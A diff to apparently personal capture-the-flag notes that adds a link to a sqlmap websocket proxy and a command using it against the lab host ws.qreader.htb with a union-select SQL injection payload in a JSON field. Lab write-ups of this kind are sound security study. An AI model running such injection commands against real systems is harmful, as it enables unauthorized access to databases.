@@ -17,7 +17,10 @@ ___
 
 [Blind SQL injection over websockets](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html)
 
+[Good websocket proxy for sqlmap](https://github.com/BKreisel/sqlmap-websocket-proxy)
 
+Used the following to escape quotes in Json requests:
+`/home/kali/.local/bin/sqlmap-websocket-proxy -u "ws://ws.qreader.htb:5789/version" -p '{"version": "\" union select 1,2,3,%param%--"}' --json -o 8085`
 
 
 ___
